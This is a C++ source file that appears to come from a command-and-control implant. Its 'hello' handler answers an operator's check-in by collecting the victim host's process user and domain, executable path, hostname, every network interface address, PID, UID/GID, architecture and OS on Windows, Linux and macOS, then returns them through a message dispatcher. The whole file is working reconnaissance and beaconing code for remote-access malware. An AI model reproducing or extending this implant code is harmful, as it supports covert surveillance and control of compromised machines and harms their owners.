#include "hello.h"
#include "util/platform.hpp"
#include "util/string.hpp"
#include "util/debug.hpp"

#if defined(OS_LINUX)
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#elif defined(OS_WINDOWS)
extern "C" {
#include "mwinapi.h"
}
#elif defined(OS_MACOS)
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cerrno>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <mach-o/dyld.h>
#include <ifaddrs.h>
#endif

namespace { // anonymous

#if defined(OS_WINDOWS)

std::string GetProcessUser() {
  std::string username = "?";
  HANDLE hToken;
  DWORD dwLength = 0;
  char cUser[512] = {0};
  char cDomain[512] = {0};
  SID_NAME_USE peUse;

  HANDLE handle = win_api->GetCurrentProcess();
  win_api->OpenProcessToken(handle, TOKEN_QUERY, &hToken);
  if (hToken) {
    win_api->GetTokenInformation(hToken, TokenUser, nullptr, 0, &dwLength);
    auto pUser = (TOKEN_USER *) malloc(dwLength);
    if (win_api->GetTokenInformation(hToken, TokenUser, pUser, dwLength, &dwLength)) {
      DWORD dwUserLength = sizeof(cUser);
      DWORD dwDomainLength = sizeof(cDomain);
      if (win_api->LookupAccountSidA(nullptr, pUser->User.Sid, cUser, &dwUserLength, cDomain, &dwDomainLength, &peUse)) {
        username = std::string(cDomain).append("\\").append(cUser);
      }
    }
    free(pUser);
    win_api->CloseHandle(hToken);
  }
  win_api->CloseHandle(handle);

  return username;
}

std::string GetProcessPath() {
  std::string path = "?";
  HANDLE hProcess = win_api->GetCurrentProcess();

  char exePath[MAX_PATH] = { 0 };
  DWORD dwSize = MAX_PATH;
  if (win_api->QueryFullProcessImageNameA(hProcess, 0, exePath, &dwSize)) {
    path = std::string(exePath);
  }

  win_api->CloseHandle(hProcess);

  return path;
}

std::string GetSystemName() {
  char temporaryBuffer[255];
  DWORD bufferSize = sizeof(temporaryBuffer);
  win_api->GetComputerNameA(temporaryBuffer, &bufferSize);
  return {temporaryBuffer};
}

std::string GetSystemIPAddresses() {
  std::string output;

  PIP_ADAPTER_INFO pAdapterInfo;
  PIP_ADAPTER_INFO pAdapter;

  ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
  pAdapterInfo = (IP_ADAPTER_INFO *)LocalAlloc(LPTR, sizeof(IP_ADAPTER_INFO));

  if (win_api->GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
    LocalFree(pAdapterInfo);
    pAdapterInfo = (IP_ADAPTER_INFO *)LocalAlloc(LPTR, ulOutBufLen);
  }

  if (win_api->GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
    pAdapter = pAdapterInfo;
    while (pAdapter) {
      std::string ipAddress = pAdapter->IpAddressList.IpAddress.String;
      if (ipAddress.find("0.0.0.0") == std::string::npos) {
        std::string interfaceName = pAdapter->Description;
        output.append(interfaceName).append(":").append(ipAddress).append(";");
      }
      pAdapter = pAdapter->Next;
    }
  }

  if (pAdapterInfo != nullptr)
    LocalFree(pAdapterInfo);

  if (output.length() > 0) {
    std::string::iterator it = output.end() - 1;
    if (*it == ';') {
      output.erase(it);
    }
  }

  return output;
}

#elif defined(OS_LINUX)

std::string GetProcessPath()
{
  char exePath[PATH_MAX];
  ssize_t len = ::readlink("/proc/self/exe", exePath, sizeof(exePath));
  if (len == -1 || len == sizeof(exePath))
      len = 0;
  exePath[len] = '\0';
  return { exePath };
}

std::string GetSystemName() {
  std::string hostname = "?";
  struct utsname buffer = {0};
  errno = 0;
  if (uname(&buffer) < 0) {
    return hostname;
  }
  return {buffer.nodename};
}

std::string GetSystemIPAddresses() {
  std::string output;

  struct ifaddrs* ifAddrStruct = nullptr;
  struct ifaddrs* ifa = nullptr;
  void* tmpAddrPtr = nullptr;

  getifaddrs(&ifAddrStruct);

  for (ifa = ifAddrStruct; ifa != nullptr; ifa = ifa->ifa_next) {
      if (!ifa->ifa_addr)
        continue;

      if (ifa->ifa_addr->sa_family == AF_INET) {
        tmpAddrPtr=&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
        char addressBuffer[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
        output.append(ifa->ifa_name).append(":").append(addressBuffer).append(";");
      }
      else if (ifa->ifa_addr->sa_family == AF_INET6) {
        tmpAddrPtr=&((struct sockaddr_in6 *)ifa->ifa_addr)->sin6_addr;
        char addressBuffer[INET6_ADDRSTRLEN];
        inet_ntop(AF_INET6, tmpAddrPtr, addressBuffer, INET6_ADDRSTRLEN);
        output.append(ifa->ifa_name).append(":").append(addressBuffer).append(";");
      }
  }
  if (ifAddrStruct != nullptr)
    freeifaddrs(ifAddrStruct);

  if (output.length() > 0) {
    std::string::iterator it = output.end() - 1;
    if (*it == ';') {
      output.erase(it);
    }
  }

  return output;
}

#elif defined(OS_MACOS)

std::string GetProcessPath()
{
  char exePath[PATH_MAX];
  uint32_t len = sizeof(exePath);
  if (_NSGetExecutablePath(exePath, &len) != 0)
  {
    exePath[0] = '\0'; // buffer too small (!)
  } else
  {
    // resolve symlinks, ., .. if possible
    char *canonicalPath = realpath(exePath, nullptr);
    if (canonicalPath != nullptr)
    {
      strncpy(exePath,canonicalPath,len);
      free(canonicalPath);
    }
  }
  return { exePath };
}

std::string GetSystemName() {
  std::string hostname = "?";
  struct utsname buffer;
  errno = 0;
  if (uname(&buffer) < 0) {
    return hostname;
  }
  return {buffer.nodename};
}

std::string GetSystemIPAddresses() {
  std::string output;

  struct ifaddrs* ifAddrStruct = nullptr;
  struct ifaddrs* ifa = nullptr;
  void* tmpAddrPtr = nullptr;

  getifaddrs(&ifAddrStruct);

  for (ifa = ifAddrStruct; ifa != nullptr; ifa = ifa->ifa_next) {
      if (!ifa->ifa_addr)
        continue;

      if (ifa->ifa_addr->sa_family == AF_INET) {
        tmpAddrPtr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
        char addressBuffer[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
        output.append(ifa->ifa_name).append(":").append(addressBuffer).append(";");
      }
      else if (ifa->ifa_addr->sa_family == AF_INET6) {
        tmpAddrPtr = &((struct sockaddr_in6 *)ifa->ifa_addr)->sin6_addr;
        char addressBuffer[INET6_ADDRSTRLEN];
        inet_ntop(AF_INET6, tmpAddrPtr, addressBuffer, INET6_ADDRSTRLEN);
        output.append(ifa->ifa_name).append(":").append(addressBuffer).append(";");
      }
  }
  if (ifAddrStruct != nullptr)
    freeifaddrs(ifAddrStruct);

  if (output.length() > 0) {
    std::string::iterator it = output.end() - 1;
    if (*it == ';') {
      output.erase(it);
    }
  }

  return output;
}

#endif

}

namespace handler {

  hello::hello(state* state) : _state(state), _worker_thread{ std::async(std::launch::async, [this] { process(); }) } {
    on_message_connection = _state->dispatcher.signal_message_received.connect<&hello::on_message>(this);

#if defined(OS_WINDOWS)
    moon_init_win_api();
#endif
  }

  hello::~hello() {
    _message_queue.stop();
  }

  void hello::process() {
    while (true) {
      try {
        auto item = _message_queue.wait_and_pop();
        std::vector<std::string> data {
            item->second->id,
#if defined(_M_IX86) || defined(__i386__)
            std::to_string(1),
#else
            std::to_string(2),
#endif
#if defined(OS_WINDOWS)
            std::to_string(1),
            std::to_string(win_api->GetCurrentProcessId()),
            GetProcessUser(),
            GetProcessPath(),
            GetSystemName(),
            GetSystemIPAddresses(),
#elif defined(OS_MACOS)
            std::to_string(3),
            std::to_string(getpid()),
            std::to_string(geteuid()).append(":").append(std::to_string(getegid())),
            GetProcessPath(),
            GetSystemName(),
            GetSystemIPAddresses(),
#elif defined(OS_LINUX)
            std::to_string(2),
            std::to_string(getpid()),
            std::to_string(geteuid()).append(":").append(std::to_string(getegid())),
            GetProcessPath(),
            GetSystemName(),
            GetSystemIPAddresses(),
#else
            std::to_string(0),
            std::to_string(0),
            std::to_string(0),
            std::to_string(0),
            std::to_string(0),
            std::to_string(0),
#endif
        };
        auto result = std::make_shared<shared::message>(item->second->id, "hello", item->second->command, util::string::join(data, '|'), true);
        _state->dispatcher.send(item->first, result);
      }
      catch (const queue_stopped& e) {
        break;
      }
    }
  }

  void hello::on_message(const std::string& implant, std::shared_ptr<shared::message> message)
  {
    if (util::string::compare_insensitive(message->type, "hello")) {
      auto item = std::make_shared<queue_item>(implant, message);
      DEBUG_PRINT("Received 'hello' message, %s\n", item->second->id);
      _message_queue.push(item);
    }
  }
}
